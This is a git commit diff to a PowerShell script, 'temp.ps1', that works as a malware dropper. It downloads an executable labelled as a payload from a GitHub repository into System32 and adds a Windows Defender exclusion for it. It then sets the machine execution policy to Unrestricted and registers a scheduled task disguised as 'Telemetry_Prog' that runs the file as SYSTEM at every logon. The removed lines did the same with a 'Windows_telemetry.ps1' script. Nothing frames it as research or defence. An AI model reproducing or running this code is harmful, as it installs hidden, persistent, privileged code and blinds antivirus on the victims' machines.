e7bd811ed8bc34bd199e53ba8241d091872f800d
mrnobody59420-hub <mr.nobody59420@gmail.com>
2025-11-20 00:12:27 -0500

    Update temp.ps1

--- temp.ps1
+++ temp.ps1
@@ -1,17 +1,15 @@
 # fetch payload from github
-Invoke-WebRequest 'https://github.com/mrnobody59420-hub/crispy-umbrella/raw/refs/heads/main/N0b0dy.exe' -OutFile "C:\Users\$Env:USERNAME\AppData\N0b0dy.exe"
-Invoke-WebRequest 'https://github.com/mrnobody59420-hub/crispy-umbrella/raw/refs/heads/main/Windows_telemetry.ps1' -OutFile "C:\Users\$Env:USERNAME\AppData\Windows_telemetry.ps1"
-# add exlusion to both files
-Add-MpPreference -ExclusionPath "C:\Users\$Env:USERNAME\AppData\Windows_telemetry.ps1"
-Add-MpPreference -ExclusionPath "C:\Users\$Env:USERNAME\AppData\N0b0dy.exe"
+Invoke-WebRequest 'https://github.com/mrnobody59420-hub/crispy-umbrella/raw/refs/heads/main/N0b0dy.exe' -OutFile "C:\Windows\System32\N0b0dy.exe"
+# add exlusion to file
+Add-MpPreference -ExclusionPath "C:\Windows\System32\N0b0dy.exe"
 # set execution policy
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine
 # add schedule to start Windows_telemetry.ps1
 # add variables for scheduler
-$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -ExecutionPolicy Bypass -File "C:\Users\$Env:USERNAME\AppData\Windows_telemetry.ps1"'
+$action = New-ScheduledTaskAction -Execute 'C:\Windows\System32\N0b0dy.exe'
 $trigger = New-ScheduledTaskTrigger -AtLogOn
 $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 # register scheduled task
 Register-ScheduledTask -TaskName "Telemetry_Prog" -Action $action -Trigger $trigger -Principal $principal
 # start process
-& "C:\Users\$Env:USERNAME\AppData\Windows_telemetry.ps1"
+
